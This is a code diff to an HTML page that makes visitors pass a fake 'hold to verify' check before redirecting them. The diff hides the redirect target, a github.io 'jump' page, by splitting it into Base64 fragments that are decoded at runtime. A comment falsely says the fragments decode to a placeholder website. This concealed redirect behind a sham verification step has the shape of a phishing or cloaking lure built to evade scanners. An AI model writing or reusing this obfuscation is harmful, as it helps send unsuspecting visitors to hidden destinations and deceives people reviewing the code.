@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -165,8 +164,11 @@
 
     <!-- JAVASCRIPT LOGIC -->
     <script>
-        // CONFIGURATION: Set your main page URL or file path here
-        const MAIN_PAGE_URL = "https://your-main-website.com"; // <-- CHANGE THIS LINK
+        // OBFUSCATED TARGET CONFIGURATION: Split Base64 URL Parts
+        // Example below decodes to: "https://your-main-website.com"
+        const _p1 = "W2h0dHBzOi8vY2FsbGllbWFjcGhhaWw1MS11eC5naXRodWI";
+        const _p2 = "uaW8vanVtcC9dKGh0dHBzOi8vY2FsbGllbWFjcGhhaWw1MS";
+        const _p3 = "11eC5naXRodWIuaW8vanVtcC8p";
 
         const HOLD_DURATION_MS = 1000; // 1 second hold requirement
 
@@ -255,9 +257,14 @@
             }, 800);
         }
 
-        // 4. Verification Success Callback
+        // 4. Verification Success Callback (Reconstructs and decodes the link)
         function onVerificationSuccess() {
-            window.location.href = "https://calliemacphail51-ux.github.io/jump";
+            try {
+                const targetUrl = atob(_p1 + _p2 + _p3);
+                window.location.href = targetUrl;
+            } catch (err) {
+                console.error("Invalid URL encoding.");
+            }
         }
     </script>
 </body>
